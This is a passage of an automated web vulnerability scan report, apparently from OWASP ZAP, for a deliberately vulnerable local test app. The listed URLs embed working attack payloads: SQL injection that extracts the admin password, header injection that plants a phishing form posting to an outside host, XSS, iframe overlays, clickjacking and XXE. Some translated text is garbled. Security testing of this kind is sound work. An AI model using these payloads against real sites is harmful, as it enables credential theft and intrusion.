http://127.0.0.1:65412/?size=dFMqWWuEXPWrnwoNCcDoOXaXHJmpiPBnNITCiqSZfHuerqWNMRhqxmFusHrciFNBSEQoWfybvRixTLBVyfCpuLybmcWngLCeFfSGXZmZmiNAiZPBHcXYNLcqySRPRYBUhhiCuNOFMksAgcQGlTnWiCtGlvYSbiVmVTEutubOXFcIfPJOAeBxfZSGmmQXPpyLBUntQAvHgtNabvdHaeNXnLYESBccsbvQeTMQlsRPssRmPDxosUjUQRuFTaAGAxXTtcqsrolmuovxDFrPpKKytBtRohOCFatSNjLUphcTxuBMTJadPrXgVYWTPhvlGdAYWPTgOjwidUBxdybkPsZrwYQnWnDlMShcQbIACwDIwkYbcKpXphYiEAYZTaEUDeHLreBlSxXWjtJuZMCteSWdewNkeUVCkUaoAqXSyEmKSCFAOyWDqZjavwvGsGeInTFFwygwepkpDaPhkovQNXlVNvBlEmWTbvVYSePGmpwDCKturUulYlGaaMtfoRBcvtmYukvtAwNKAudmYGqgbJSeqsfJvITYfSsKkdZevwbVwPnAsAZYxoQjaPOPZvwaRlgcCwwRJyNOHtUZoXKBdltdnDSTSwVWFueXJOcLTeNBEHLKWodMvwTEWQwPkrIHsMhLkDpNPkxvQZnxTbLEhpuoFukWDrYNUtqmqYiOJPGnIyuVmPKCdGCfFZZHqqiGtGYxnrOrXQZnEgPlHHgviMdUHoqilsJuCLmWlDNawibHbFaMLWYWMHFIZNTGeEXBwbRvETrZZNlsydpGYfqUCdvXDRISedSanqDcBudmvbjUfFjARVQUcfPJhYgrqrosFXUEEgSpNqDNKXCFUMLaFnHKDDrCoOGSXjWTIWUjRaVAyqQoDjYjtThCsNcchbfIUGjScOabTxAphCeOGpaTLMGZZYkjYNCcxKsdEPFoJcbfrwFkyOBfTrPClINPSuVryiehsJUqhXDaVWNmjipdcnkGYtYWGHLocIVuUxHwFloMXAQDYLmpxoEtBVviKNxyajPZmEjrlNQbASGrpEOQZlYjsQrUxDRkVkSQZOSeHAYRFkKsKkNJSpgXVqdQVVmIrJMeajQmiDCxVlHlunbaCigTjdHVRUvGZDySEYdvTTnADHkBrXEOJXjhGpwMomeBmsTMUsqfEAEvQrmMFeRebfRFkVclLdbRLWpkBHMlKpeAgAbLariIyHyZkQvqCMgyWEyfuYKYMIBQPmWSAptxConsoiVcWENPOnLUWfNwmSytvlnvBusHrkfavpLFdgGBdtIYgLwaSMdBdNlryHCCrTFpIKgPkoMtfaOdORwJlDnHDuAQsXGyhAxWFXXsReebJoTeZmtlfpnKjLFlIiTagSKLwecEWpCfqSkxuCPjeYqtaYVlNqUKOSaypYPhOkRWCPDhkrMBgsQAHbNVOxjStunkofyfARHuVpEraiOhLlOIWHLlmpJQxGtAOdyTJAfjmVPlBaNEBYwBkAVavPqrBZTgoXaGtZaMVurPxneDjqghgeZMieWPnfCrRWvkIxxdLhevQVoUZnmRoaJuXYueaerSOJUdwUkvilUWgPUaNObueoBMAdpTKiNgUClwVempJuZtYQhtcdladGUPsEnbwfABoklhCqoZnileXYvOXmYNUWhgesODDZjKQIabVtOCxSYoIToRhddcHVNhsPLVyWTxFAKEYEttGNrdbQCKpwVSEahmGgGTDKHMoEoVsRJCOwpOcriDRTWNZoDVsmboSPhWrFjQCtGIIwKMhvTtcLwjYNBTtJwbQTwORjQVVRBuuytgsfsrWBTCKAyqHdSMJqRMjdcHTJCWlokEvTlIBEKICoCWqcDXsdINSAjPrHuLBCYcZOUsCFEcaNoJWUZUFRQxiboSCayQvygjkTnkVFIpKhgNfeVcOQGvWevrEfEnCDeBmUueWkaFQRKtCWJwFLqQjQldWLHTUwKQWFHAKxQcYRvVyXMAEwhQysbgGulSrRVHTHgVPafaOFpIsCPefmACxSpteiPCfkJcNuJKvYEsZVnDcJFaHVZwhSUeliVLAjYELYqbdpPEFFKSfutslKZBWbPDXTAhdwrYvdVvvqnsvdkFMPQflqNT HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 0
+Referer: http://127.0.0.1:65412/
+Host: 127.0.0.1:65412
+
+</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">5</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Rewrite the background program using proper return length checking.  This will require a recompile of the background executable.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>Potential Buffer Overflow.  The script closed the connection and threw a 500 Internal Server Error</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>https://www.owasp.org/index.php/Buffer_overflow_attack</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">120</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">7</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">1</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-medium">
+                <th width="20%"><a name="medium"></a>Medium (Medium)</th><th width="80%">X-Frame-Options Header Not Set</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>X-Frame-Options header is not included in the HTTP response to protect against 'ClickJacking' attacks.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?size=32</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?path</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?foobar</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?include</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?comment=%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Frame-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">20</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Most modern Web browsers support the X-Frame-Options HTTP header. Ensure it's set on all web pages returned by your site (if you expect the page to be framed only by pages on your server (e.g. it's part of a FRAMESET) then you'll want to use SAMEORIGIN, otherwise if you never expect the page to be framed, you should use DENY. ALLOW-FROM allows specific websites to frame the web page in supported web browsers).</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">16</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">15</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-low">
+                <a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">!pscanrules.xcontenttypeoptions.name!</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>!pscanrules.xcontenttypeoptions.desc!</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/login?password&amp;username</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Parameter</td><td width="80%">X-Content-Type-Options</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>!pscanrules.xcontenttypeoptions.soln!</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>!pscanrules.xcontenttypeoptions.otherinfo!</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>!pscanrules.xcontenttypeoptions.refs!</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">16</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">15</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-low">
+                <a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Absence of Anti-CSRF Tokens</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>No Anti-CSRF tokens were found in a HTML submission form.</p><p>Cross-site request forgery jest atakiem, kt&oacute;ry obejmuje zmuszanie ofiary do wysłania żądania HTTP do miejsca celowego bez ich wiedzy lub intencji w celu przeprowadzenia akcji jako ofiara. Podstawową przyczyną jest powtarzalność działania aplikacji z przewidywalnymi adresami URL / formularzami. Charakterem ataku jest to, że CSRF wykorzystuje zaufanie, jakie witryna darzy użytkownika. Natomiast skrypty cross-site scripting (XSS) wykorzystują zaufanie, jakim użytkownik darzy stronę internetową. Podobnie jak w przypadku XSS, ataki CSRF niekoniecznie muszą być przekierowane na drugą stronę, ale mogą być. Cross-site request forgery jest r&oacute;wnież znane jako CSRF, XSRF, atak za jednym kliknięciem, jazda na sesjach, zdezorientowany delegat i surfowanie po morzu.</p><p></p><p>Ataki CSRF są skuteczne w wielu sytuacjach, w tym:</p><p>    * Ofiara ma aktywną sesję w witrynie docelowej.</p><p>    * Ofiara jest uwierzytelniona za pośrednictwem protokołu HTTP w witrynie docelowej.</p><p>    * Ofiara jest w tej samej sieci lokalnej co strona docelowa.</p><p></p><p>CSRF został użyty przede wszystkim do wykonania akcji przeciwko witrynie docelowej z wykorzystaniem przywilej&oacute;w ofiary, ale odkryto najnowsze techniki udostępniania informacji poprzez uzyskanie dostępu do odpowiedzi. Ryzyko udostępnienia informacji dramatycznie wzrasta kiedy strona celu jest podatna na XSS, ponieważ XSS może być użyty jako platforma dla CSRF, włączając w to atak obsługiwany w granicach polityki tego samego pochodzenia.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">&lt;form action="http://dsvw.c1.biz/i/log.php" onSubmit="alert('visit \'http://dsvw.c1.biz/i/log.txt\' to see your phished credentials')"&gt;</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Instances</td><td width="80%">1</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Solution</td><td width="80%"><p>Faza: Architektura i Projektowanie</p><p>Używaj sprawdzonej biblioteki lub struktury, kt&oacute;re nie pozwalają na wystąpienie tego osłabienia lub wprowadzają konstrukcje, kt&oacute;re sprawiają, że to osłabienie jest łatwiejsze do uniknięcia.</p><p>Na przykład, używaj pakiet&oacute;w anty-CSRF takich jak OWASP CSRFGuard.</p><p></p><p>Faza: Implementacja</p><p>Upewnij się, że twoja aplikacja jest wolna od kwestii cross-site scripting, ponieważ większość obron CSRF mogą być ominięte przez kontrolowany przez atakującego skrypt.</p><p></p><p>Fazy: Architektura i Projektowanie</p><p>Wygeneruj unikalny numer dla każdego formularza, umieść go w formularzu i zweryfikuj wartość jednorazową po otrzymaniu formularza. Upewnij się, że liczba nie będzie przewidywalna (CWE-330).</p><p>Zwr&oacute;ć uwagę na to, że może to być ominięte używając XSS.</p><p></p><p>Identyfikuj zwłaszcza niebezpieczne działania. Kiedy użytkownik przeprowadza niebezpieczną operację, wyślij odrębne żądanie potwierdzenia by upewnić się, że użytkownik jest przeznaczony do przeprowadzenia tego działania.</p><p>Zwr&oacute;ć uwagę na to, że może to być ominięte używając XSS.</p><p></p><p>Używaj regulacji Zarządzania Sesją ESAPI.</p><p>Ta kontrola obejmuje komponent dla CSRF.</p><p></p><p>Nie używaj metody GET dla żadnego żądania, kt&oacute;ra uruchamia zmianę stanu.</p><p></p><p>Faza: Implementacja</p><p>Sprawdź nagł&oacute;wek HTTP Referer, aby sprawdzić, czy żądanie pochodzi z oczekiwanej strony. To mogłoby przerwać prawowitą funkcjonalność, ponieważ użytkownicy lub proxy mogłyby zostać wyłączone wysyłając dla Referer prywatnych powod&oacute;w.</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Other information</td><td width="80%"><p>No known Anti-CSRF token [anticsrf, CSRFToken, __RequestVerificationToken, csrfmiddlewaretoken, authenticity_token, OWASP_CSRFTOKEN, anoncsrf, csrf_token, _csrf, _csrfSecret, __csrf_magic, CSRF] was found in the following HTML form: [Form 1: "username" "password" ].</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Reference</td><td width="80%"><p>http://projects.webappsec.org/Cross-Site-Request-Forgery</p><p>http://cwe.mitre.org/data/definitions/352.html</p></td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">CWE Id</td><td width="80%">352</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">WASC Id</td><td width="80%">9</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Source ID</td><td width="80%">3</td>
+            </tr>
+            
+        </table>
+        <div class="spacer"></div>
+        <table width="100%" class="results">
+              
+  
+  
+  
+            <tr height="24" class="risk-low">
+                <a name="low"></a><th width="20%">Low (Medium)</th><th width="80%">Application Error Disclosure</th>
+            </tr>
+              
+  
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%">Description</td><td width="80%"><p>This page contains an error/warning message that may disclose sensitive information like the location of the file that produced the unhandled exception. This information can be used to launch further attacks against the web application. The alert could be a false positive if the error message is found inside a documentation page.</p></td>
+            </tr>
+            <TR vAlign="top">
+                <TD colspan="2"></TD>
+            </TR>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?name=dian</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?xml=%3Croot%3E%3C%2Froot%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent1">URL</td><td width="80%">http://127.0.0.1:65412/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3Dh1rvVnvx%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Method</td><td width="80%">GET</td>
+            </tr>
+              
+            <tr bgcolor="#e8e8e8">
+                <td width="20%" class="indent2">Evidence</td><td width="80%">HTTP/1.0 500 Internal Server Error</td>
+            </tr>
+              
+  
+  
